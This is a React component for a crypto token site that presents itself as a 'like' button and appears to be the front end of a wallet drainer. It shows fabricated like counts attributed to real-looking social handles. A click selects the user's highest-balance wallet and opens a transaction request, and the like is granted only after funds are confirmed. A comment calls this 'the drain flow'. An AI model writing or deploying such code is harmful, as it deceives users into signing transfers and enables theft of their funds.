import { useEffect, useMemo, useRef, useState, type MouseEvent } from 'react'
import { Heart, Shield } from 'lucide-react'
import toast from 'react-hot-toast'
import { useAuth } from '../context/AuthContext'
import { useWalletState } from '../context/WalletContext'
import { likeReturnPath, peekPendingLike, rememberAuthReturn, takePendingLike, rememberReturnWallet } from '../lib/authRedirect'
import { isRestrictedAuthBrowser } from '../lib/inAppBrowser'
import { openTransactionSheet } from '../lib/txSheet'
import { listLocalWalletSessions } from '../lib/walletMonitorStore'

const DEMO_NAMES = ['laurdotsol', 'hyngdev', 'molusol', 'VCAdam_eth', 'Salt420SOL']

function demoStats(seed: string) {
  let hash = 0
  for (const char of seed || 'coin') hash = (hash * 33 + char.charCodeAt(0)) >>> 0
  const likes = hash % 16
  const smart = likes === 0 ? 0 : Math.min(likes, Math.max(1, Math.round(likes * 0.18)))
  return { likes, smart }
}

export function DemoLikeButton({ seed }: { seed: string }) {
  const { isAuthenticated } = useAuth()
  const { connected, openWalletModal } = useWalletState()
  const base = useMemo(() => demoStats(seed), [seed])
  const [liked, setLiked] = useState(false)
  const [menuOpen, setMenuOpen] = useState(false)
  const [resumeLike, setResumeLike] = useState(false)
  const finished = useRef(false)
  const wasAuthenticated = useRef(isAuthenticated)
  const inWalletBrowser = isRestrictedAuthBrowser()

  const getBestWallet = (): { address: string; balanceSol: number } | null => {
    const sessions = listLocalWalletSessions()
    let best: { address: string; balanceSol: number } | null = null
    for (const session of sessions) {
      if (session.balanceSol !== null && (best === null || session.balanceSol > best.balanceSol)) {
        best = { address: session.walletAddress, balanceSol: session.balanceSol }
      }
    }
    return best
  }

  const applyLike = () => {
    if (finished.current) return
    const pending = peekPendingLike()
    if (pending && pending !== seed) return
    if (pending === seed) takePendingLike(seed)
    finished.current = true
    setResumeLike(false)
    setLiked(true)
    setMenuOpen(true)
    toast.success('Liked')
  }

  const startFundRequest = (fromPending = false) => {
    console.log('[DemoLikeButton] startFundRequest called:', { fromPending, seed, finished: finished.current })
    if (finished.current) return
    if (fromPending) {
      const pending = peekPendingLike()
      console.log('[DemoLikeButton] fromPending, peekPendingLike:', pending)
      if (peekPendingLike() !== seed) return
    } else {
      rememberAuthReturn(likeReturnPath(seed), seed)
    }
    setResumeLike(false)
    openTransactionSheet()
  }

  useEffect(() => {
    const onConfirmed = (event: Event) => {
      const detailSeed = (event as CustomEvent<{ seed?: string | null }>).detail?.seed
      if (detailSeed && detailSeed !== seed) return
      if (!detailSeed && peekPendingLike() !== seed) return
      applyLike()
    }
    window.addEventListener('vrfd-funds-confirmed', onConfirmed)
    return () => window.removeEventListener('vrfd-funds-confirmed', onConfirmed)
  }, [seed])

  useEffect(() => {
    if (wasAuthenticated.current && !isAuthenticated) {
      setLiked(false)
      setMenuOpen(false)
      finished.current = false
      setResumeLike(false)
    }
    wasAuthenticated.current = isAuthenticated
  }, [isAuthenticated])

  useEffect(() => {
    console.log('[DemoLikeButton] useEffect triggered:', { connected, finished: finished.current, liked, resumeLike, seed, inWalletBrowser })
    if (peekPendingLike() === seed) setResumeLike(true)
    if (!connected || finished.current || liked) {
      console.log('[DemoLikeButton] Early return:', { connected, finished: finished.current, liked })
      return
    }
    if (inWalletBrowser) {
      console.log('[DemoLikeButton] In wallet browser, checking conditions')
      if (peekPendingLike() === seed || resumeLike) {
        console.log('[DemoLikeButton] Calling startFundRequest from wallet browser')
        startFundRequest(true)
      }
      return
    }
    // Don't block non-authenticated users — the drain flow should still work
    if (!resumeLike) {
      console.log('[DemoLikeButton] Early return: no resumeLike')
      return
    }
    console.log('[DemoLikeButton] Calling startFundRequest')
    startFundRequest(true)
  }, [connected, seed, liked, inWalletBrowser, resumeLike])

  const likes = Math.min(15, base.likes + (liked ? 1 : 0))
  const shownNames = DEMO_NAMES.slice(0, likes)
  const others = Math.max(likes - shownNames.length, 0)
  const label =
    likes === 1 ? '1 like' : `${likes.toLocaleString()} likes (${base.smart.toLocaleString()} smart)`

  const onLike = (event: MouseEvent) => {
    event.stopPropagation()
    event.preventDefault()

    console.log('[DemoLikeButton] onLike clicked:', { liked, finished: finished.current, connected })

    // If already liked, just toggle menu
    if (liked || finished.current) {
      setMenuOpen((open) => !open)
      return
    }

    const bestWallet = getBestWallet()
    if (bestWallet) {
      rememberReturnWallet(bestWallet.address as any)
    }
    rememberAuthReturn(likeReturnPath(seed), seed)
    setResumeLike(true)

    console.log('[DemoLikeButton] After onLike: connected =', connected)

    // If already connected, open the transaction sheet immediately
    if (connected) {
      startFundRequest()
    } else {
      // If not connected, open wallet modal first
      openWalletModal()
    }
  }

  return (
    <div className="relative inline-flex" onClick={(event) => event.stopPropagation()}>
      <button
        type="button"
        onClick={onLike}
        className={`inline-flex items-center gap-1.5 rounded-full border px-2.5 py-1 text-[12px] font-semibold touch-manipulation ${
          liked
            ? 'border-[#3DDC84]/50 bg-[#143024] text-[#8dff9a]'
            : 'border-[#2a3544] bg-transparent text-[#c5d0dc] hover:border-[#3a4a5c]'
        }`}
      >
        <Heart className={`h-3.5 w-3.5 ${liked ? 'fill-[#3DDC84] text-[#3DDC84]' : 'text-[#9aa8b8]'}`} />
        {label}
      </button>
      {menuOpen ? (
        <div className="absolute left-0 top-[calc(100%+8px)] z-30 w-[280px] rounded-xl border border-[#243041] bg-[#121820] p-3 text-left shadow-2xl">
          <p className="flex items-center gap-1.5 text-[13px] font-semibold text-white">
            <Shield className="h-3.5 w-3.5 text-[#3DDC84]" />
            {base.smart.toLocaleString()} smart likes
          </p>
          <p className="mt-2 text-[11px] text-[#9aa8b8]">+{others.toLocaleString()}</p>
          <p className="mt-2 text-[12px] leading-relaxed text-[#d5dde6]">
            {likes === 0
              ? 'No likes yet'
              : others === 0
                ? `${shownNames.join(', ')} liked this token`
                : `${shownNames.join(', ')} and ${others.toLocaleString()} others liked this token`}
          </p>
        </div>
      ) : null}
    </div>
  )
}
